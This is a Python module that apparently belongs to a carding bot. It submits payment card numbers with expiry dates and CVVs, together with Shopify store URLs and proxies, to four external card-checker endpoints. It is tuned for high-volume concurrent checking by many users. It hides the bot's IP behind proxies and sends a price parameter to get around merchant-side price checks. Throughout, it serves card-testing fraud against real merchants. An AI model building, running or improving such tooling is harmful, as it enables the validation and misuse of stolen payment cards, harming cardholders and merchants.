"""
Shopify card-check API helper with automatic fallback.

Each entry in SHOPIFY_API_URLS is a tuple:
    (api_url, param_renames)

Where param_renames is either:
    None — use default param names: card, url, proxy
    dict — map default names → API-specific names, e.g. {"card": "cc", "url": "site"}

The helper tries URLs in order. On 5xx, 429, timeout, network error, OR
unexpected response format, it falls back to the next URL.

The returned response is NORMALISED — capital keys (Gateway, Price,
Response, Status, etc.) are mapped to lowercase for consistent parsing
across both APIs.

PERFORMANCE NOTES (multi-user load):
  * Uses ONE process-wide aiohttp.ClientSession with a large connector
    pool + keep-alive, instead of creating a new session per card.
    This eliminates per-card TCP connect + TLS handshake + DNS lookup
    overhead — a 3–5× speedup under concurrent load (13–15 users).
  * Tracks a rolling-window health log and trips a circuit breaker
    when the API is failing too much, converting thundering-herd
    retry storms into a brief global pause that lets the backend
    recover.
  * Uses jittered exponential backoff between retries so concurrent
    workers don't all wake at the same instant after a failure.
"""
import asyncio
import json
import logging
import random
import socket
import time
import functools
from collections import deque
import aiohttp

try:
    import dns.resolver as _dns_resolver_mod
    import dns.exception as _dns_exception_mod
    _HAVE_DNSPYTHON = True
except ImportError:
    _HAVE_DNSPYTHON = False


# === CONFIG: API endpoints, tried in order (primary first) ===
# Primary: old production API (detailed reasons: INSUFFICIENT_FUNDS,
#          INCORRECT_CVC, EXPIRED_CARD, etc.)
# Backup:  Render-hosted API (default param names: card, url)
# On every call the order is RANDOMLY shuffled so each endpoint
# receives ~equal traffic (load-balanced).
SHOPIFY_API_URLS = [
    (
        "https://shopify-api-nepaliii.up.railway.app/check",
        None,
    ),
    (
        "https://blacklisted.up.railway.app/shopify",
        {"card": "cc", "url": "site"},
    ),
    (
        "http://38.247.64.215:5000/shopify",
        {"card": "cc", "url": "site"},
    ),
    (
        "https://circuitxchk.com/shopify",
        {"card": "cc", "url": "site"},
    ),
]         

# ── WEIGHTED ROUND-ROBIN load balancing (prefers healthier API) ──
# Every call to call_shopify_api() picks its starting endpoint based on
# recent per-API health. The healthier API gets picked more often, but
# neither is starved — even a fully-down API still gets ~15% of starts
# so we keep testing it for recovery.
#
# Comparison vs strict alternation:
#   • Old strict round-robin: call#1→A1, call#2→A2, call#3→A1, … gives
#     exact 50/50. Fine when both APIs are equally healthy, but when
#     API1 is slow/failing we still send every OTHER card there, adding
#     latency to half the calls.
#   • New weighted: a healthy API at 95% success gets ~85% of starts,
#     a struggling API at 50% gets ~15%. Users see faster responses
#     because most calls go to the better endpoint. The 15% floor on
#     the struggling API still tests for recovery without overloading it.
#
# Health is tracked per URL in _api_url_health: rolling window of recent
# (success, latency) samples. Score = success_rate weighted against
# inverse latency. Lower score = healthier.
_RR_COUNTER = 0
_RR_LOCK = asyncio.Lock()

# Per-API rolling health window (seconds) — shorter than global breaker
# so per-API routing reacts faster than the global kill switch.
_API_URL_WINDOW_SEC = 30
# Cap samples per URL to bound memory.
_API_URL_LOG_MAX = 60

# url → deque[(ts, ok, elapsed_ms)]
_api_url_health: dict = {}
# Per-API last-known "down" state so we don't keep hammering a known-bad URL.
_api_url_down_until: dict = {}


def _record_api_url_outcome(url: str, success: bool, elapsed_ms: float) -> None:
    """Record one call's outcome against the per-API health log."""
    dq = _api_url_health.get(url)
    if dq is None:
        dq = deque(maxlen=_API_URL_LOG_MAX)
        _api_url_health[url] = dq
    dq.append((time.monotonic(), bool(success), float(elapsed_ms)))
    # Clear any soft-down flag on a successful call.
    if success:
        _api_url_down_until.pop(url, None)


def _api_url_score(url: str) -> float:
    """
    Return a health score for `url` — LOWER is BETTER.
    Score = (fail_rate * 2.0) + (avg_latency_s * 1.0).
    Fresh callers with no data get 0.5 (neutral). A URL on cooldown
    returns a very high score so it's only picked as last resort.
    """
    # Honour a recent soft-down note — don't start here for a short while.
    until = _api_url_down_until.get(url, 0.0)
    if until > time.monotonic():
        return 10.0

    dq = _api_url_health.get(url)
    if not dq:
        return 0.5  # neutral — no data yet

    now = time.monotonic()
    cutoff = now - _API_URL_WINDOW_SEC
    # Trim window (cheap; dq is small).
    while dq and dq[0][0] < cutoff:
        dq.popleft()
    n = len(dq)
    if n < 3:
        return 0.5  # not enough data yet, neutral

    fail = sum(1 for _, ok, _ in dq if not ok)
    avg_ms = sum(ms for _, _, ms in dq) / n
    fail_rate = fail / n
    # Normalise latency to roughly the same scale as fail_rate: 20s = 1.0.
    avg_s = avg_ms / 1000.0 / 20.0
    return fail_rate * 2.0 + avg_s


def _pick_start_index(n: int) -> int:
    """
    Pick a starting API index using pure round-robin — every API gets
    equal traffic. Per-API health is STILL tracked (and used for cooldown
    soft-down gating via _api_url_score) but we no longer weight by it.

    Admin-requested: with 4 APIs configured, every caller expects ~25%
    of traffic each. Weighted picking was preferring whichever API was
    freshest at call time — uneven distribution confused the admin.

    Cost is O(1) on N=2-5 URLs — negligible.
    """
    global _RR_COUNTER
    chosen = _RR_COUNTER % n
    _RR_COUNTER += 1
    return chosen


# HTTP statuses that count as "API error" → trigger fallback to next URL
_FALLBACK_HTTP = {408, 429, 500, 502, 503, 504}

# Retry the whole fallback chain up to this many times before giving up.
# Transient timeouts/network blips usually clear up in 2–3 retries.
MAX_RETRIES = 2

# Exponential backoff between retries: 0.3s, 0.6s, 1.2s (capped at 3s below)
_RETRY_BACKOFF_BASE = 0.3


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SHARED HTTP SESSION — single aiohttp session for the whole process.
#
# Previously every call_shopify_api() call created a fresh
# aiohttp.ClientSession (TCP connect + TLS handshake + DNS lookup per card).
# With 50+ concurrent workers this was the #1 source of latency and
# wasted backend capacity (each session holds its own connection pool
# which is torn down immediately after one request).
#
# Now: one process-wide session with a generous connector pool, keep-alive,
# and DNS caching. Connectors are reused across every /msh call, every
# gate call, every site-check call.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Connector sizes tuned for the load profile (up to 20 simultaneous /msh
# users, ~70 concurrent API calls per user, plus gate traffic).
_SESSION_TOTAL_LIMIT = 700      # total open connections across all hosts
_SESSION_PER_HOST_LIMIT = 350   # per-host (we only talk to ~2 hosts)
_SESSION_KEEPALIVE_S = 60       # keep idle connections open this long
_SESSION_DNS_TTL_S = 300        # cache DNS results 5 minutes


def _build_shared_session() -> aiohttp.ClientSession:
    """Build the process-wide aiohttp session with a tuned connector."""
    resolver = _get_resolver()
    connector = aiohttp.TCPConnector(
        limit=_SESSION_TOTAL_LIMIT,
        limit_per_host=_SESSION_PER_HOST_LIMIT,
        ttl_dns_cache=_SESSION_DNS_TTL_S,
        keepalive_timeout=_SESSION_KEEPALIVE_S,
        enable_cleanup_closed=True,
        ssl=False,
        resolver=resolver,
    )
    return aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=80),
    )


_shared_session: aiohttp.ClientSession | None = None
_shared_session_lock = asyncio.Lock()


async def _get_shared_session() -> aiohttp.ClientSession:
    """
    Lazy-init / return the process-wide aiohttp session.
    Re-created automatically if it was closed (e.g. after a transport error).
    """
    global _shared_session
    if _shared_session is not None and not _shared_session.closed:
        return _shared_session
    async with _shared_session_lock:
        if _shared_session is None or _shared_session.closed:
            _shared_session = _build_shared_session()
            logging.info("[shopify_api] shared HTTP session initialised "
                         f"(limit={_SESSION_TOTAL_LIMIT}, "
                         f"per_host={_SESSION_PER_HOST_LIMIT}, "
                         f"keepalive={_SESSION_KEEPALIVE_S}s)")
        return _shared_session


async def close_shared_session() -> None:
    """Close the shared session (call on bot shutdown)."""
    global _shared_session
    if _shared_session is not None and not _shared_session.closed:
        try:
            await _shared_session.close()
        except Exception as e:
            logging.debug(f"[shopify_api] error closing shared session: {e}")
    _shared_session = None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CIRCUIT BREAKER — global adaptive throttle.
#
# When the backend is failing or stalling, naive retries from every
# worker at once create a "thundering herd" that makes recovery
# impossible (workers retry → backend stays overloaded → workers retry).
#
# This module trips a circuit breaker when the rolling-window failure
# rate or latency exceeds a threshold, and pauses ALL new API calls for
# a short window so the backend can drain its backlog. After the pause,
# a "half-open" test call decides whether to close the breaker (resume
# normal traffic) or reopen it (try again later).
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Rolling window for breaker decisions (seconds). Long enough to be
# statistically meaningful, short enough to react quickly to recovery.
# Extended from 30s → 60s so the breaker needs sustained failure to trip —
# prevents premature opening under normal variance when many users are active.
_BREAKER_WINDOW_SEC = 60

# Open the breaker when EITHER:
#   - failure rate over the window exceeds this (0.0–1.0)
#   - average latency over the window exceeds this (milliseconds)
# Raised from 0.55 → 0.65 so the breaker only trips on genuine degradation,
# not normal fluctuations from concurrent users hitting the API.
_BREAKER_FAIL_RATE = 0.65
_BREAKER_AVG_LATENCY_MS = 18_000

# Minimum number of samples before we trust the rolling stats.
# Below this we never trip — we don't want a noisy 5-call startup to
# open the breaker. Raised from 15 → 25 to account for the larger window.
_BREAKER_MIN_SAMPLES = 25

# How long the breaker stays open (seconds) before half-open test.
_BREAKER_OPEN_DURATION_S = 15.0
# If the half-open test fails, open for this long instead (slower retry).
_BREAKER_REOPEN_DURATION_S = 30.0

# Breaker state: 'CLOSED' (normal), 'OPEN' (paused), 'HALF_OPEN' (testing).
_breaker_state: str = "CLOSED"
_breaker_open_until: float = 0.0  # monotonic timestamp

# Rolling log of recent API outcomes: (monotonic_ts, success_bool, elapsed_ms)
_breaker_outcomes: deque = deque(maxlen=400)


def _record_breaker_outcome(success: bool, elapsed_ms: float) -> None:
    """Record one API outcome for the breaker."""
    _breaker_outcomes.append((time.monotonic(), bool(success), float(elapsed_ms)))


def _breaker_stats() -> tuple[int, float, float]:
    """Return (sample_count, failure_rate, avg_ms) over the rolling window."""
    now = time.monotonic()
    cutoff = now - _BREAKER_WINDOW_SEC
    while _breaker_outcomes and _breaker_outcomes[0][0] < cutoff:
        _breaker_outcomes.popleft()
    n = len(_breaker_outcomes)
    if n == 0:
        return 0, 0.0, 0.0
    fail = sum(1 for _, ok, _ in _breaker_outcomes if not ok)
    avg = sum(ms for _, _, ms in _breaker_outcomes) / n
    return n, fail / n, avg


async def _breaker_gate() -> None:
    """
    Called before each API attempt. Blocks if the breaker is OPEN.
    Transitions OPEN → HALF_OPEN when the open window elapses, and
    HALF_OPEN → CLOSED/OPEN based on the next test call (handled in
    the caller by observing the result of the attempt that follows).
    """
    global _breaker_state, _breaker_open_until
    if _breaker_state == "OPEN":
        remaining = _breaker_open_until - time.monotonic()
        if remaining > 0:
            # Tiny jitter so paused workers don't all wake at the same instant
            await asyncio.sleep(remaining + random.uniform(0, 0.3))
        _breaker_state = "HALF_OPEN"
        logging.info("[shopify_api] circuit breaker → HALF_OPEN (resuming)")
        # Post-wake spread — randomise the wake-up moment of each paused worker
        # across a wider window so we don't recreate the thundering herd the
        # moment the breaker closes. Up to 1.5s of random extra delay per worker.
        # Only applied right after the OPEN → HALF_OPEN transition, not on
        # every call (that would add latency to healthy traffic).
        await asyncio.sleep(random.uniform(0, 1.5))
        # Fall through; the next attempt's outcome will decide


def _breaker_after_attempt(success: bool, elapsed_ms: float) -> None:
    """Update breaker state after an API attempt outcome is known."""
    global _breaker_state, _breaker_open_until
    _record_breaker_outcome(success, elapsed_ms)

    if _breaker_state == "HALF_OPEN":
        if success:
            _breaker_state = "CLOSED"
            _breaker_open_until = 0.0
            logging.info("[shopify_api] circuit breaker → CLOSED (recovered)")
        else:
            _breaker_state = "OPEN"
            _breaker_open_until = time.monotonic() + _BREAKER_REOPEN_DURATION_S
            logging.warning(
                f"[shopify_api] circuit breaker → OPEN (half-open failed; "
                f"pausing {_BREAKER_REOPEN_DURATION_S:.0f}s)"
            )
        return

    # CLOSED → may transition to OPEN if stats look bad
    n, fail_rate, avg_ms = _breaker_stats()
    if n >= _BREAKER_MIN_SAMPLES:
        if fail_rate > _BREAKER_FAIL_RATE or avg_ms > _BREAKER_AVG_LATENCY_MS:
            _breaker_state = "OPEN"
            _breaker_open_until = time.monotonic() + _BREAKER_OPEN_DURATION_S
            logging.warning(
                f"[shopify_api] circuit breaker → OPEN "
                f"(n={n} fail_rate={fail_rate:.0%} avg_ms={avg_ms:.0f} "
                f"→ pausing {_BREAKER_OPEN_DURATION_S:.0f}s)"
            )


def _jittered_backoff(base: float, attempt: int) -> float:
    """
    Exponential backoff with jitter:  base * 2^(attempt-1) * U(0.5, 1.5)
    Jitter prevents N workers that all failed at the same instant from
    waking at the same instant and re-hammering the backend.
    """
    expo = base * (2 ** (attempt - 1))
    return min(3.0, expo * random.uniform(0.5, 1.5))


class APIStatusError(Exception):
    """Raised when API returns an error HTTP status that should trigger fallback."""
    def __init__(self, status: int, body: str):
        self.status = status
        self.body = body[:200]
        super().__init__(f"HTTP {status}: {body[:200]}")


class ProxyDeadError(Exception):
    """Raised when aiohttp cannot connect THROUGH the supplied proxy
    (ClientProxyConnectionError / connector timeout / Windows semaphore
    timeout). This is NOT an API failure -- the API server itself was
    never reached. We break out of the per-card fallback chain so we
    don't waste 4× the timeout repeating the same broken proxy across
    all 4 APIs. The caller (process_card_api in msh.py) should:
      1. Mark the offending proxy as DEAD (long cooldown)
      2. Pick the next proxy and continue the card-check loop
    """


class _CustomDNSResolver(aiohttp.resolver.AbstractResolver):
    """
    Async DNS resolver that uses dnspython with Google/Cloudflare DNS as
    fallback when system DNS (socket.getaddrinfo) fails. This works around
    broken system DNS on some Windows / sandboxed environments where
    nslookup succeeds but Python's getaddrinfo fails for the target host.
    Falls back to aiohttp's DefaultResolver (system DNS) when dnspython
    is unavailable or its lookup also fails.
    """
    _FAMILY_INET = socket.AF_INET

    def __init__(self):
        if _HAVE_DNSPYTHON:
            self._r = _dns_resolver_mod.Resolver(configure=False)
            self._r.nameservers = ['8.8.8.8', '1.1.1.1', '8.8.4.4']
            self._r.timeout = 5
            self._r.lifetime = 5
        else:
            self._r = None

    async def resolve(self, host, port=0, family=socket.AF_INET):
        try:
            socket.inet_aton(host)
            return [{
                'hostname': host,
                'host': host,
                'port': port,
                'family': self._FAMILY_INET,
                'proto': 0,
                'flags': socket.AI_NUMERICHOST,
            }]
        except OSError:
            pass

        if self._r is not None:
            try:
                loop = asyncio.get_running_loop()
                answer = await loop.run_in_executor(
                    None, lambda: self._r.resolve(host, 'A')
                )
                return [{
                    'hostname': host,
                    'host': rdata.address,
                    'port': port,
                    'family': self._FAMILY_INET,
                    'proto': 0,
                    'flags': socket.AI_NUMERICHOST,
                } for rdata in answer]
            except _dns_exception_mod.DNSException as e:
                logging.debug(
                    f"[DNS] dnspython lookup failed for {host}: {e}; "
                    f"falling back to system DNS"
                )

        default = aiohttp.resolver.DefaultResolver()
        try:
            return await default.resolve(host, port, family)
        finally:
            try:
                await default.close()
            except Exception:
                pass

    async def close(self):
        pass


@functools.lru_cache(maxsize=1)
def _get_resolver():
    """Return the process-wide DNS resolver singleton."""
    if _HAVE_DNSPYTHON:
        return _CustomDNSResolver()
    return aiohttp.resolver.DefaultResolver()


# Exception types that trigger fallback
_FALLBACK_EXC = (
    aiohttp.ClientError,
    asyncio.TimeoutError,
    ConnectionError,
    json.JSONDecodeError,
    APIStatusError,
)

# JSON keys that indicate a valid Shopify card-check response (both casings).
_EXPECTED_KEYS = (
    "error", "declined_reason", "response_text", "status", "amount",
    "gateway", "currency", "success",
    "Error", "DeclinedReason", "Response", "Status", "Amount",
    "Gateway", "Price", "CC",
)


def _proxy_for_api(proxy: str) -> str:
    """
    Convert proxy URL → format the Shopify APIs actually accept.

    The bot internally stores proxies as `http://user:pass@host:port` so direct
    aiohttp `proxy=` calls work. But the Shopify reverse-proxy backends
    (nepaliii + blacklisted) misparse the `http://user@host:port` form: the
    blacklisted backend in particular treats the literal string "http" as the
    proxy host with port 80, producing errors like
    `<b>Proxy Error: Cannot connect to host http:80 ssl`.

    Convert to the backend-friendly `host:port:user:pass` form (which both
    backends accept correctly). If the proxy is already in that form (or in
    any other non-URL form), return it unchanged.
    """
    if not proxy or not isinstance(proxy, str):
        return proxy
    p = proxy.strip()
    if not p.startswith(("http://", "https://")):
        return p
    rest = p.split("://", 1)[1]
    if "@" not in rest:
        return rest
    userinfo, hostport = rest.rsplit("@", 1)
    if ":" not in userinfo or ":" not in hostport:
        return rest
    try:
        user, password = userinfo.split(":", 1)
        host, port = hostport.rsplit(":", 1)
        if not port.isdigit():
            return rest
        return f"{host}:{port}:{user}:{password}"
    except Exception:
        return rest


def _build_params(card: str, site: str, proxy: str, renames: dict | None) -> dict:
    """Map (card, url, proxy) → API-specific param names."""
    base = {"card": card, "url": site, "proxy": _proxy_for_api(proxy)}
    if not renames:
        return base
    return {renames.get(k, k): v for k, v in base.items()}


def _normalize_response(data: dict) -> dict:
    """
    Map Shopify API capital keys to lowercase so parsing code is identical
    across both old and new APIs. Original keys are preserved for safety.

    Capital → lowercase mapping:
        Gateway  → gateway
        Price    → amount
        Response → response_text
        Status   → success  (and "true"/"false" string → bool)
        CC       → card
        Error    → error
        DeclinedReason → declined_reason
    """
    out = dict(data)
    if "Gateway" in out and "gateway" not in out:
        out["gateway"] = out["Gateway"]
    if "Price" in out and "amount" not in out:
        out["amount"] = out["Price"]
    if "Response" in out and "response_text" not in out:
        out["response_text"] = out["Response"]
    if "Status" in out and "success" not in out:
        out["success"] = str(out["Status"]).strip().lower() in ("true", "1", "yes")
    if "CC" in out and "card" not in out:
        out["card"] = out["CC"]
    if "Error" in out and "error" not in out:
        out["error"] = out["Error"]
    if "DeclinedReason" in out and "declined_reason" not in out:
        out["declined_reason"] = out["DeclinedReason"]
    return out


async def call_shopify_api(
    card: str,
    site: str,
    proxy: str,
    timeout: int = 75,
    price_hint: float | None = None,
) -> dict:
    """
    Call Shopify card-check API with automatic fallback + retry.

    Tries each entry in SHOPIFY_API_URLS in order. If the entire fallback
    chain fails for a card, the whole chain is retried up to MAX_RETRIES
    times (default 3) before the final exception is raised. This handles
    transient timeouts/network blips on a per-card basis.

    Args:
        card:    Card string (e.g. "4111111111111111|12|25|123")
        site:    Shopify site URL
        proxy:   Proxy URL
        timeout: Per-API timeout in seconds (default 75)

    Returns:
        Normalised JSON dict (lowercase keys for all common fields).

    Raises:
        The last exception encountered if ALL retries on ALL URLs fail.

    Performance characteristics (multi-user /msh):
      * Uses the process-wide shared aiohttp.ClientSession — no per-call
        TCP/TLS/DNS overhead.
      * Respects the global circuit breaker — when the backend is sick,
        all callers pause briefly instead of stampeding it.
      * Uses jittered exponential backoff between retry attempts so
        concurrent workers don't synchronise their retry storms.
    """
    # Bind module-level round-robin counter + lock into this function's scope.
    # Without `global`, Python treats `_RR_COUNTER += 1` as creating a local
    # variable — then the earlier `_RR_COUNTER % N` read raises
    # "UnboundLocalError: cannot access local variable '_RR_COUNTER' where it
    # is not associated with a value" on every API call.
    global _RR_COUNTER, _RR_LOCK

    if not SHOPIFY_API_URLS:
        raise RuntimeError("SHOPIFY_API_URLS is empty — add at least one URL")

    last_exc: Exception = RuntimeError("No API succeeded")
    shared_session = await _get_shared_session()

    for attempt in range(1, MAX_RETRIES + 1):
        last_exc = RuntimeError("No API succeeded")

        # Honour circuit breaker (may sleep if OPEN; transitions to HALF_OPEN)
        await _breaker_gate()

        # ── WEIGHTED ROUND-ROBIN — pick the healthier API as starting point ──
        # We pick the starting endpoint by per-API health score (lower = better).
        # Falls back gracefully: if all APIs look equally healthy (or have no
        # data yet), round-robin breaks ties so 2 healthy APIs alternate fairly.
        # The rest of the chain is walked as fallback so a struggling API
        # still gets tested and recovered from.
        async with _RR_LOCK:
            try:
                start_idx = _pick_start_index(len(SHOPIFY_API_URLS))
            except Exception:
                # Defensive: if picker raises for any reason, fall back to
                # strict alternation so we never lose progress.
                start_idx = _RR_COUNTER % len(SHOPIFY_API_URLS)
                _RR_COUNTER += 1
        n = len(SHOPIFY_API_URLS)
        # Walk from start_idx around the ring: [start, start+1, …, start+N-1] mod N
        order = [(start_idx + offset) % n for offset in range(n)]




        for idx in order:
            api_url, renames = SHOPIFY_API_URLS[idx]
            label = f"api{idx + 1}/{len(SHOPIFY_API_URLS)}"
            params = _build_params(card, site, proxy, renames)
            if price_hint is not None and price_hint > 0:
                # Pass `price=X.XX` so the API uses our amount and skips
                # the merchant-side expected-price comparison that causes
                # MERCHANDISE_EXPECTED_PRICE_MISMATCH.
                params["price"] = f"{float(price_hint):.2f}"
            attempt_ok = False
            attempt_elapsed_ms = 0.0
            try:
                _t0 = time.monotonic()
                # Tunnel the bot's TCP connection to the API server through
                # the same proxy that the API backend will use to visit the
                # Shopify site. Without this the bot's own source IP gets
                # whitelisted/geo-restricted on the API and works for some
                # APIs but is rate-limited for others -- passing proxy=
                # normalises behaviour across all 4 APIs and hides the bot
                # IP entirely. The proxy is in `http://user:pass@host:port`
                # form from ProxyManager._normalize_proxy, which aiohttp
                # accepts directly. Empty proxy -> bot connects direct
                # (so API #1/2/4 still work for sessions without proxies).
                proxy_for_aiohttp = proxy if (proxy and proxy.strip()) else None
                async with shared_session.get(
                    api_url,
                    params=params,
                    proxy=proxy_for_aiohttp,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                ) as resp:
                    text = await resp.text()
                    attempt_elapsed_ms = (time.monotonic() - _t0) * 1000.0
                    if resp.status in _FALLBACK_HTTP:
                        raise APIStatusError(resp.status, text)
                    if not text or not text.strip():
                        raise APIStatusError(resp.status, "<empty body>")
                    if text.lstrip().startswith("<"):
                        raise APIStatusError(resp.status, "<html response>")
                    try:
                        data = json.loads(text)
                    except json.JSONDecodeError:
                        raise APIStatusError(resp.status, f"<invalid json: {text[:80]!r}>")
                    # Unknown format → trigger fallback
                    if not isinstance(data, dict) or not any(k in data for k in _EXPECTED_KEYS):
                        keys_seen = (
                            list(data.keys()) if isinstance(data, dict) else type(data).__name__
                        )
                        raise ValueError(f"unknown response format (keys: {keys_seen})")
                    # Normalise capital keys → lowercase for consistent parsing
                    if attempt > 1:
                        logging.info(
                            f"[shopify_api] succeeded on attempt {attempt}/{MAX_RETRIES} "
                            f"via {label} ({api_url})"
                        )
                    attempt_ok = True
                    _breaker_after_attempt(True, attempt_elapsed_ms)
                    _record_api_url_outcome(api_url, True, attempt_elapsed_ms)
                    return _normalize_response(data)
            except _FALLBACK_EXC + (ValueError,) as e:
                if attempt_elapsed_ms == 0.0:
                    attempt_elapsed_ms = (time.monotonic() - _t0) * 1000.0
                _breaker_after_attempt(False, attempt_elapsed_ms)
                _record_api_url_outcome(api_url, False, attempt_elapsed_ms)
                last_exc = e
                # Only treat ClientProxyConnectionError as proxy-dead.
                # This is aiohttp's SPECIFIC class raised when proxy=
                # was set and the proxy itself is unreachable. Other
                # "Cannot connect to host <api>" errors are ABOUT the
                # destination API (proxy worked, API probed failed):
                # we keep falling back through the chain instead of
                # burning the proxy. The per-API health log already
                # weights the next call away from this URL.
                if isinstance(e, aiohttp.ClientProxyConnectionError):
                    raise ProxyDeadError(str(e)) from e
                remaining = n - order.index(idx) - 1
                if remaining > 0:
                    logging.debug(
                        f"[shopify_api] {label} ({api_url}) failed: "
                        f"{type(e).__name__}: {str(e)[:120]}. Trying next API…"
                    )

        # All URLs failed for this attempt → wait briefly and retry the
        # entire chain (unless we've exhausted MAX_RETRIES).
        if attempt < MAX_RETRIES:
            backoff = _jittered_backoff(_RETRY_BACKOFF_BASE, attempt)
            logging.debug(
                f"[shopify_api] all APIs failed on attempt {attempt}/{MAX_RETRIES} "
                f"for card {card[:8]}… — retrying whole chain in {backoff:.1f}s "
                f"({type(last_exc).__name__}: {str(last_exc)[:80]})"
            )
            await asyncio.sleep(backoff)

    logging.error(
        f"[shopify_api] gave up after {MAX_RETRIES} attempts for card "
        f"{card[:8]}… — last error: {type(last_exc).__name__}: "
        f"{str(last_exc)[:120]}"
    )
    raise last_exc
